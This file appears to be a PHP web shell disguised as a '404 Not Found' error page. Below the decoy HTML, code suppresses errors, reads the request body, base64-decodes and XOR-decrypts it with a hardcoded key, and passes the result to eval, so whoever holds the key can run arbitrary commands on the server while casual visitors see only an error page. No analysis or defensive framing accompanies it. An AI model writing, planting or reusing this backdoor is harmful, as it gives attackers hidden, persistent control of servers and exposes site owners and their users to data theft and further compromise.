<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html>
    <head>
        <title>404 Not Found</title>
    </head>
    <body>
        <h1>Not Found</h1>
        <p>The requested URL was not found on this server.</p>
    </body>
    </html>
<?php
@error_reporting(0);
function Decrypt($data)
{
    $key="e45e329feb5d925b"; 
    $bs="base64_"."decode";
	$after=$bs($data."");
	for($i=0;$i<strlen($after);$i++) {
    	$after[$i] = $after[$i]^$key[$i+1&15]; 
    }
    return $after;
}
$post=Decrypt(file_get_contents("php://input"));
eval($post);
?>
